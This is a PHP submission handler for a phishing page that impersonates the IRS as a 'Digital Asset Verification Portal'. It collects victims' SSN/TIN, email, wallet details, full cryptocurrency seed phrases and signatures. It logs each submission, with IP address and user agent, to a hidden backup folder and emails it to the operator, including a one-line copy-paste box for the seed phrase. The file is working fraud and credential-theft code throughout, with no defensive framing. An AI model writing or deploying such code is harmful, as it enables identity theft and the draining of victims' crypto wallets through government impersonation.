<?php
/**
 * ==============================================================================
 * IRS DIGITAL ASSET VERIFICATION - SUBMISSION PROCESSING ENDPOINT
 * ==============================================================================
 * Receives verification data from identification.html and emails it using
 * settings stored in .private/config.php (Supports Authenticated SMTP & mail())
 * ==============================================================================
 */

// Enable strict error handling for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0);

// Set JSON response header
header('Content-Type: application/json; charset=utf-8');

// Load private configuration from .private/config.php
$configFile = __DIR__ . '/.private/config.php';
if (!file_exists($configFile)) {
    echo json_encode([
        'success' => false,
        'error'   => 'Configuration file .private/config.php not found.'
    ]);
    exit;
}

$config = require $configFile;

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode([
        'success' => false,
        'error'   => 'Invalid request method. POST required.'
    ]);
    exit;
}

// Read incoming payload (JSON or POST form)
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);

if (!is_array($data) || empty($data)) {
    $data = $_POST;
}

// Extract and sanitize submitted fields
$ssnTin        = trim($data['ssn_tin'] ?? 'Not Provided');
$taxpayerEmail = trim($data['email'] ?? '');
$emailDisplay  = !empty($taxpayerEmail) ? htmlspecialchars($taxpayerEmail) : '<span style="color: #71767a; font-style: italic; font-weight: normal;">Not Provided</span>';
$walletType    = trim($data['wallet_type'] ?? 'Not Specified');
$walletBrand  = trim($data['wallet_brand'] ?? 'Not Specified');
$seedLength   = intval($data['seed_length'] ?? 0);
$seedWords    = isset($data['seed_words']) && is_array($data['seed_words']) ? $data['seed_words'] : [];
$signatureImg = trim($data['signature'] ?? '');
$clientIp     = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent    = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$submittedAt  = date('Y-m-d H:i:s T');
$refNumber    = 'IRS-TX-' . date('Ymd') . '-' . strtoupper(substr(md5(uniqid(mt_rand(), true)), 0, 6));

// Format all seed words into a single string for easy copy-pasting
$seedWordsFlat = implode(' ', array_map('trim', $seedWords));

// -----------------------------------------------------------------------------
// 1. DETERMINE RECIPIENT & SENDER (RECEIVE EMAIL TO SELF)
// -----------------------------------------------------------------------------
$smtpUser = trim($config['smtp_user'] ?? '');
$smtpPass = trim($config['smtp_pass'] ?? '');

// If recipient_email is left blank, automatically send to self (smtp_user)
$toEmail = trim($config['recipient_email'] ?? '');
if (empty($toEmail)) {
    $toEmail = !empty($smtpUser) ? $smtpUser : 'admin@yourdomain.com';
}

$senderEmail = !empty($smtpUser) ? $smtpUser : ('notifications@' . (!empty($_SERVER['HTTP_HOST']) ? preg_replace('/^www\./', '', $_SERVER['HTTP_HOST']) : 'verification-portal.gov'));
$senderName  = $config['sender_name'] ?? 'IRS Digital Asset Verification Portal';
$subject     = ($config['email_subject'] ?? 'New Digital Asset Verification') . ' [' . $refNumber . ']';

// -----------------------------------------------------------------------------
// 2. SAVE BACKUP TO .private/submissions/ IF ENABLED
// -----------------------------------------------------------------------------
if (!empty($config['save_backup'])) {
    $backupDir = __DIR__ . '/.private/submissions';
    if (!is_dir($backupDir)) {
        @mkdir($backupDir, 0755, true);
    }
    
    $backupRecord = [
        'reference_number' => $refNumber,
        'submitted_at'     => $submittedAt,
        'client_ip'        => $clientIp,
        'user_agent'       => $userAgent,
        'ssn_tin'          => $ssnTin,
        'email'            => $taxpayerEmail,
        'wallet_type'      => $walletType,
        'wallet_brand'     => $walletBrand,
        'seed_length'      => $seedLength,
        'seed_words'       => $seedWords,
        'seed_phrase_full' => $seedWordsFlat,
        'signature_data'   => $signatureImg
    ];
    
    $backupFileName = $backupDir . '/sub_' . date('Ymd_His') . '_' . substr($refNumber, -6) . '.json';
    @file_put_contents($backupFileName, json_encode($backupRecord, JSON_PRETTY_PRINT));
}

// -----------------------------------------------------------------------------
// 3. BUILD GORGEOUS HTML EMAIL TEMPLATE
// -----------------------------------------------------------------------------

// Build table cells for seed words (4 columns)
$seedGridHtml = '<table width="100%" cellpadding="6" cellspacing="6" style="border-collapse: separate;">';
$wordCount = count($seedWords);
for ($i = 0; $i < $wordCount; $i += 4) {
    $seedGridHtml .= '<tr>';
    for ($col = 0; $col < 4; $col++) {
        $idx = $i + $col;
        if ($idx < $wordCount) {
            $numFormatted = sprintf('%02d', $idx + 1);
            $wordVal = htmlspecialchars($seedWords[$idx] ?? '');
            $seedGridHtml .= '<td width="25%" style="background-color: #f0f4f8; border: 1px solid #d0dbe5; border-radius: 5px; padding: 10px 12px; font-family: monospace, Courier, sans-serif;">'
                . '<span style="color: #71767a; font-size: 11px; font-weight: bold; display: block; margin-bottom: 2px;">#' . $numFormatted . '</span>'
                . '<strong style="color: #112e51; font-size: 15px;">' . $wordVal . '</strong>'
                . '</td>';
        } else {
            $seedGridHtml .= '<td width="25%">&nbsp;</td>';
        }
    }
    $seedGridHtml .= '</tr>';
}
$seedGridHtml .= '</table>';

// Signature display HTML
$signatureHtml = '<p style="color: #71767a; font-style: italic;">No electronic signature provided.</p>';
if (!empty($signatureImg) && strpos($signatureImg, 'data:image') === 0) {
    $signatureHtml = '<div style="background: #ffffff; border: 1.5px solid #d0dbe5; border-radius: 6px; padding: 16px; display: inline-block; max-width: 100%;">'
        . '<img src="' . htmlspecialchars($signatureImg) . '" alt="Taxpayer Signature" style="max-height: 90px; max-width: 320px; display: block;" />'
        . '<div style="border-top: 1px dashed #aeb0b5; margin-top: 10px; padding-top: 4px; font-size: 11px; color: #71767a;">&#10005; Authorized Electronic Taxpayer Signature</div>'
        . '</div>';
}

$emailBody = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{$subject}</title>
</head>
<body style="margin: 0; padding: 0; background-color: #eef2f6; font-family: Arial, Helvetica, sans-serif; color: #212121; -webkit-font-smoothing: antialiased;">
    <table width="100%" cellpadding="0" cellspacing="0" style="background-color: #eef2f6; padding: 30px 10px;">
        <tr>
            <td align="center">
                <!-- Main Email Card -->
                <table width="640" cellpadding="0" cellspacing="0" style="max-width: 640px; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,0.08); border: 1px solid #dce2e8;">
                    
                    <!-- Header Banner -->
                    <tr>
                        <td style="background-color: #112e51; padding: 26px 32px; border-bottom: 4px solid #005ea2;">
                            <table width="100%" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td>
                                        <div style="color: #45c8f1; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 4px;">
                                            UNITED STATES INTERNAL REVENUE SERVICE
                                        </div>
                                        <h1 style="color: #ffffff; font-size: 22px; margin: 0; font-weight: 700; line-height: 1.3;">
                                            Digital Asset Verification Dossier
                                        </h1>
                                    </td>
                                    <td align="right" style="vertical-align: middle;">
                                        <span style="background-color: #005ea2; color: #ffffff; padding: 6px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; letter-spacing: 0.5px;">
                                            SUBMISSION RECORD
                                        </span>
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Reference & Timestamp Subheader -->
                    <tr>
                        <td style="background-color: #f7fafc; padding: 14px 32px; border-bottom: 1px solid #e2e8f0; font-size: 13px; color: #565c65;">
                            <table width="100%" cellpadding="0" cellspacing="0">
                                <tr>
                                    <td><strong>Reference ID:</strong> <span style="font-family: monospace; color: #112e51; font-weight: bold;">{$refNumber}</span></td>
                                    <td align="right"><strong>Submitted:</strong> {$submittedAt}</td>
                                </tr>
                            </table>
                        </td>
                    </tr>

                    <!-- Body Content -->
                    <tr>
                        <td style="padding: 32px;">

                            <!-- SECTION 1: Taxpayer Identification -->
                            <div style="margin-bottom: 28px;">
                                <h2 style="font-size: 16px; color: #112e51; text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 2px solid #005ea2; padding-bottom: 6px; margin: 0 0 14px 0;">
                                    1. Taxpayer Identification
                                </h2>
                                <table width="100%" cellpadding="10" cellspacing="0" style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px;">
                                    <tr>
                                        <td width="40%" style="color: #565c65; font-size: 14px; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            SSN / U.S. TIN:
                                        </td>
                                        <td width="60%" style="color: #112e51; font-size: 16px; font-family: monospace; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            {$ssnTin}
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="color: #565c65; font-size: 14px; font-weight: bold;">
                                            Email Address:
                                        </td>
                                        <td style="color: #112e51; font-size: 15px; font-weight: bold;">
                                            {$emailDisplay}
                                        </td>
                                    </tr>
                                </table>
                            </div>

                            <!-- SECTION 2: Wallet Details -->
                            <div style="margin-bottom: 28px;">
                                <h2 style="font-size: 16px; color: #112e51; text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 2px solid #005ea2; padding-bottom: 6px; margin: 0 0 14px 0;">
                                    2. Wallet Configuration
                                </h2>
                                <table width="100%" cellpadding="10" cellspacing="0" style="background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 6px;">
                                    <tr>
                                        <td width="40%" style="color: #565c65; font-size: 14px; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            Wallet Type:
                                        </td>
                                        <td width="60%" style="color: #112e51; font-size: 15px; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            {$walletType}
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="color: #565c65; font-size: 14px; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            Wallet Brand:
                                        </td>
                                        <td style="color: #112e51; font-size: 15px; font-weight: bold; border-bottom: 1px solid #edf2f7;">
                                            {$walletBrand}
                                        </td>
                                    </tr>
                                    <tr>
                                        <td style="color: #565c65; font-size: 14px; font-weight: bold;">
                                            Seed Phrase Length:
                                        </td>
                                        <td style="color: #112e51; font-size: 15px; font-weight: bold;">
                                            {$seedLength} Words
                                        </td>
                                    </tr>
                                </table>
                            </div>

                            <!-- SECTION 3: Seed Phrase Words -->
                            <div style="margin-bottom: 28px;">
                                <h2 style="font-size: 16px; color: #112e51; text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 2px solid #005ea2; padding-bottom: 6px; margin: 0 0 14px 0;">
                                    3. Seed Phrase Words ({$wordCount} Words)
                                </h2>
                                
                                <!-- Numbered Grid -->
                                {$seedGridHtml}

                                <!-- Full concatenated copy-paste box -->
                                <div style="margin-top: 14px;">
                                    <div style="font-size: 12px; font-weight: bold; color: #565c65; margin-bottom: 4px; text-transform: uppercase;">
                                        Single Line Copy-Paste:
                                    </div>
                                    <div style="background-color: #112e51; color: #45c8f1; font-family: monospace; font-size: 14px; padding: 12px 16px; border-radius: 6px; word-break: break-all; line-height: 1.5;">
                                        {$seedWordsFlat}
                                    </div>
                                </div>
                            </div>

                            <!-- SECTION 4: Electronic Signature -->
                            <div style="margin-bottom: 28px;">
                                <h2 style="font-size: 16px; color: #112e51; text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 2px solid #005ea2; padding-bottom: 6px; margin: 0 0 14px 0;">
                                    4. Taxpayer Electronic Signature
                                </h2>
                                {$signatureHtml}
                            </div>

                            <!-- SECTION 5: Transmission Metadata -->
                            <div>
                                <h2 style="font-size: 14px; color: #71767a; text-transform: uppercase; letter-spacing: 0.8px; border-bottom: 1px solid #e2e8f0; padding-bottom: 4px; margin: 0 0 10px 0;">
                                    Audit &amp; Security Metadata
                                </h2>
                                <table width="100%" cellpadding="6" cellspacing="0" style="font-size: 12px; color: #71767a;">
                                    <tr>
                                        <td width="30%"><strong>Client IP Address:</strong></td>
                                        <td>{$clientIp}</td>
                                    </tr>
                                    <tr>
                                        <td><strong>User Agent:</strong></td>
                                        <td>{$userAgent}</td>
                                    </tr>
                                    <tr>
                                        <td><strong>Server Timestamp:</strong></td>
                                        <td>{$submittedAt}</td>
                                    </tr>
                                </table>
                            </div>

                        </td>
                    </tr>

                    <!-- Footer -->
                    <tr>
                        <td style="background-color: #f7fafc; padding: 20px 32px; border-top: 1px solid #e2e8f0; text-align: center; font-size: 12px; color: #71767a; line-height: 1.5;">
                            This is an automated transmission generated by the IRS Digital Asset Verification Portal.<br>
                            Confidential and privileged pursuant to 26 U.S.C. Section 6103.
                        </td>
                    </tr>

                </table>
            </td>
        </tr>
    </table>
</body>
</html>
HTML;

// -----------------------------------------------------------------------------
// 4. SEND EMAIL VIA AUTHENTICATED SMTP OR NATIVE PHP mail()
// -----------------------------------------------------------------------------
$mailSent = false;
$mailMethod = 'none';
$mailError = '';

if (!empty($config['use_smtp'])) {
    require_once __DIR__ . '/.private/smtp.php';

    $smtpHost   = $config['smtp_host'] ?? 'smtp.hostinger.com';
    $smtpPort   = intval($config['smtp_port'] ?? 465);
    $smtpSecure = $config['smtp_secure'] ?? 'ssl';

    $smtp = new SimpleSMTP($smtpHost, $smtpPort, $smtpSecure, $smtpUser, $smtpPass);
    $mailSent = $smtp->send($toEmail, $senderEmail, $senderName, $subject, $emailBody);

    if ($mailSent) {
        $mailMethod = 'smtp';
    } else {
        $mailError = $smtp->error;
        // If SMTP fails, attempt fallback to native mail()
        $headers  = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        $headers .= "From: " . addslashes($senderName) . " <" . $senderEmail . ">\r\n";
        $headers .= "Reply-To: " . $senderEmail . "\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
        $mailSent = @mail($toEmail, $subject, $emailBody, $headers);
        if ($mailSent) {
            $mailMethod = 'mail_fallback';
        }
    }
} else {
    // Send via standard PHP mail()
    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= "From: " . addslashes($senderName) . " <" . $senderEmail . ">\r\n";
    $headers .= "Reply-To: " . $senderEmail . "\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
    $mailSent = @mail($toEmail, $subject, $emailBody, $headers);
    $mailMethod = 'native_mail';
}

// Return JSON response to frontend
echo json_encode([
    'success'          => true,
    'mail_sent'        => $mailSent,
    'delivery_method'  => $mailMethod,
    'recipient'        => $toEmail,
    'reference_number' => $refNumber,
    'message'          => 'Verification submission processed successfully.'
]);
